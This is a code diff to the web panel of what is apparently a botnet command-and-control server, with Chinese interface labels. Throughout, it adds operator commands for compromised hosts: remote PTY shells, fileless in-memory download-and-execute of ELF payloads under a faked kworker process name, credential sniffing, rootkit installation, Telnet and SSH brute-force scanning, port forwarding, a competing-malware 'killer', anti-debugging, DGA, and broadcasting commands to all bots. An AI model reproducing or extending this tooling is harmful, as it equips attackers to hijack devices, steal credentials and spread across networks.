@@ -1078,7 +1078,16 @@ function submitSocksModal() {
 
 var cmdArgDefs = {
   '!shell': [{ id: 'arg-shell-cmd', label: '执行命令', placeholder: '例如 whoami, ls -la, cat /etc/passwd', tooltip: '在目标主机上执行的Shell命令，结果通过C2回传' }],
+  '!ptyshell': [{ id: 'arg-pty-path', label: 'Shell路径 (可选)', placeholder: '/bin/bash (默认 /bin/sh)', tooltip: '在目标主机上发起的 PTY 伪终端 shell 可执行文件路径' }],
   '!detach': [{ id: 'arg-detach-cmd', label: '执行命令', placeholder: '例如 nohup ./payload &', tooltip: '在目标主机后台执行的命令，不等待回显' }],
+  '!memexec': [
+    { id: 'arg-memexec-url', label: 'ELF 下载 URL', placeholder: '例如 http://example.com/payload.elf', tooltip: '在目标主机上通过 memfd_create 无文件直接从 URL 下载并执行的 ELF 可执行文件' },
+    { id: 'arg-memexec-args', label: '命令行参数 (可选)', placeholder: '例如 --daemon -v', tooltip: '传递给内存执行 ELF 的命令行参数' }
+  ],
+  '!memexecb64': [
+    { id: 'arg-memexec-b64', label: 'Base64 数据', placeholder: '粘贴 Base64 编码的 ELF 二进制数据...', tooltip: 'Base64 编码的二进制 payload，将在受控端内存中无文件解密并直接执行' },
+    { id: 'arg-memexec-argv0', label: '伪造进程名 (可选)', placeholder: 'kworker/0:1 (默认)', tooltip: '在进程列表中伪装的 argv[0] 名称' }
+  ],
   '!socks': [
     {
       id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
@@ -1096,11 +1105,54 @@ var cmdArgDefs = {
     { id: 'arg-sa-user', label: '用户名', placeholder: 'SOCKS用户名', tooltip: '主机代理的新SOCKS5用户名' },
     { id: 'arg-sa-pass', label: '密码', placeholder: 'SOCKS密码', type: 'password', tooltip: '主机代理的新SOCKS5密码' }
   ],
+  '!portscan': [
+    { id: 'arg-ps-target', label: '目标 IP / CIDR', placeholder: '例如 192.168.1.1 或 192.168.1.0/24', tooltip: '扫描的目标 IP 地址或 CIDR 网段' },
+    { id: 'arg-ps-ports', label: '端口范围', placeholder: '例如 22,80,443,100-200', tooltip: '英文逗号分隔的端口号或连续范围' },
+    { id: 'arg-ps-timeout', label: '超时 (ms)', placeholder: '1000 (默认)', tooltip: '单端口 TCP 连接超时毫秒数' }
+  ],
+  '!portfwd': [
+    { id: 'arg-pf-lport', label: '本地监听端口', placeholder: '例如 8080', tooltip: '受控端 127.0.0.1 上监听的端口' },
+    { id: 'arg-pf-rhost', label: '远程目标 IP', placeholder: '例如 192.168.1.100', tooltip: '转发流量到达的远端 IP 地址' },
+    { id: 'arg-pf-rport', label: '远程目标端口', placeholder: '例如 80', tooltip: '转发流量到达的远端服务端口' }
+  ],
+  '!stopportfwd': [
+    { id: 'arg-pf-stop-port', label: '本地端口 (留空=全部)', placeholder: '例如 8080 (留空停止全部)', tooltip: '要停止转发的本地端口号，留空则停止该主机上所有的端口转发' }
+  ],
+  '!listfwd': [],
+  '!sniffer': [
+    {
+      id: 'arg-sniffer-act', label: '动作', type: 'select', options: [
+        { v: 'start', t: '启动抓包 (start)' },
+        { v: 'dump', t: '导出捕获凭据 (dump)' },
+        { v: 'stop', t: '停止抓包 (stop)' }
+      ]
+    },
+    { id: 'arg-sniffer-iface', label: '网卡接口 (可选)', placeholder: '如 eth0 (留空为默认网卡)', showWhen: { field: 'arg-sniffer-act', val: 'start' }, tooltip: '指定监听抓包的网络接口' }
+  ],
+  '!killer': [
+    {
+      id: 'arg-killer-act', label: '动作', type: 'select', options: [
+        { v: 'status', t: '检查状态 (status)' },
+        { v: 'start', t: '启动杀手守护进程 (start)' },
+        { v: 'stop', t: '停止守护进程 (stop)' }
+      ]
+    }
+  ],
+  '!rootkit': [
+    {
+      id: 'arg-rootkit-act', label: '动作', type: 'select', options: [
+        { v: 'status', t: '检查 Rootkit 状态 (status)' },
+        { v: 'install', t: '安装 Rootkit (install)' },
+        { v: 'remove', t: '卸载 Rootkit (remove)' }
+      ]
+    }
+  ],
+  '!telnet_scan': [{ id: 'arg-tscan-cidr', label: '目标 CIDR 网段', placeholder: '例如 192.168.1.0/24', tooltip: '并发爆破扫描 Telnet (23) 的目标网段' }],
+  '!ssh_scan': [{ id: 'arg-sscan-cidr', label: '目标 CIDR 网段', placeholder: '例如 10.0.0.0/24', tooltip: '并发爆破扫描 SSH (22) 的目标网段' }],
+  '!stop_scan': [],
+  '!antidbg': [],
+  '!dga': [],
   '!info': [], '!persist': [],
-  '!scan': [{ id: 'arg-scan-addr', label: '扫描结果接收端', placeholder: 'host:port (如 1.2.3.4:48290)', tooltip: '接收扫描爆破凭据结果的服务端地址' }],
-  '!stopscan': [],
-  '!tr064': [], '!stoptr064': [],
-  '!hnap': [], '!stophnap': [],
   '!reinstall': [{ id: 'arg-reinstall-url', label: '脚本下载URL', placeholder: '例如 http://example.com/x.sh', tooltip: '下载执行脚本的URL。主机下载后通过sh执行替换自身' }],
   '!lolnogtfo': []
 };
@@ -1144,7 +1196,16 @@ function buildArgs() {
   var typ = document.getElementById('cmd-type').value;
   switch (typ) {
     case '!shell': return (document.getElementById('arg-shell-cmd') || {}).value || '';
+    case '!ptyshell': return (document.getElementById('arg-pty-path') || {}).value || '';
     case '!detach': return (document.getElementById('arg-detach-cmd') || {}).value || '';
+    case '!memexec':
+      var u = (document.getElementById('arg-memexec-url') || {}).value || '';
+      var a = (document.getElementById('arg-memexec-args') || {}).value || '';
+      return a ? u + ' ' + a : u;
+    case '!memexecb64':
+      var b = (document.getElementById('arg-memexec-b64') || {}).value || '';
+      var v = (document.getElementById('arg-memexec-argv0') || {}).value || '';
+      return v ? b + ' ' + v : b;
     case '!socks':
       var mode = (document.getElementById('arg-socks-mode') || {}).value || 'direct';
       if (mode === 'relay') {
@@ -1155,11 +1216,58 @@ function buildArgs() {
       var u = (document.getElementById('arg-sa-user') || {}).value || '';
       var p = (document.getElementById('arg-sa-pass') || {}).value || '';
       return (u && p) ? u + ' ' + p : '';
+    case '!portscan':
+      var t = (document.getElementById('arg-ps-target') || {}).value || '';
+      var p = (document.getElementById('arg-ps-ports') || {}).value || '';
+      var tm = (document.getElementById('arg-ps-timeout') || {}).value || '1000';
+      return (t && p) ? t + ' ' + p + ' ' + tm : '';
+    case '!portfwd':
+      var lp = (document.getElementById('arg-pf-lport') || {}).value || '';
+      var rh = (document.getElementById('arg-pf-rhost') || {}).value || '';
+      var rp = (document.getElementById('arg-pf-rport') || {}).value || '';
+      return (lp && rh && rp) ? lp + ' ' + rh + ' ' + rp : '';
+    case '!stopportfwd': return (document.getElementById('arg-pf-stop-port') || {}).value || '';
+    case '!sniffer':
+      var act = (document.getElementById('arg-sniffer-act') || {}).value || 'start';
+      var iface = (document.getElementById('arg-sniffer-iface') || {}).value || '';
+      return (act === 'start' && iface) ? act + ' ' + iface : act;
+    case '!killer': return (document.getElementById('arg-killer-act') || {}).value || 'status';
+    case '!rootkit': return (document.getElementById('arg-rootkit-act') || {}).value || 'status';
+    case '!telnet_scan': return (document.getElementById('arg-tscan-cidr') || {}).value || '';
+    case '!ssh_scan': return (document.getElementById('arg-sscan-cidr') || {}).value || '';
     case '!reinstall': return (document.getElementById('arg-reinstall-url') || {}).value || '';
-    case '!scan': return (document.getElementById('arg-scan-addr') || {}).value || '';
     default: return '';
   }
 }
+
+function sendBroadCmd(cmdStr) {
+  fetch('/api/command', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ command: cmdStr, botID: '' })
+  })
+    .then(function (r) { return r.json(); })
+    .then(function (d) { showToast(d.message, d.success); })
+    .catch(function () { showToast('发送命令失败', false); });
+}
+
+function startScannerCmd(cmdName, inputId) {
+  var cidr = (document.getElementById(inputId) || {}).value || '';
+  if (!cidr) { showToast('请输入目标 CIDR 网段', false); return; }
+  sendBroadCmd(cmdName + ' ' + cidr.trim());
+}
+
+function stopScannerCmd() {
+  sendBroadCmd('!stop_scan');
+}
+
+function startPortScanCmd() {
+  var target = (document.getElementById('scan-ps-target') || {}).value || '';
+  var ports = (document.getElementById('scan-ps-ports') || {}).value || '';
+  if (!target || !ports) { showToast('请输入目标 IP/CIDR 与端口范围', false); return; }
+  sendBroadCmd('!portscan ' + target.trim() + ' ' + ports.trim() + ' 1000');
+}
+
 
 function sendCmd() {
   var typ = document.getElementById('cmd-type').value;
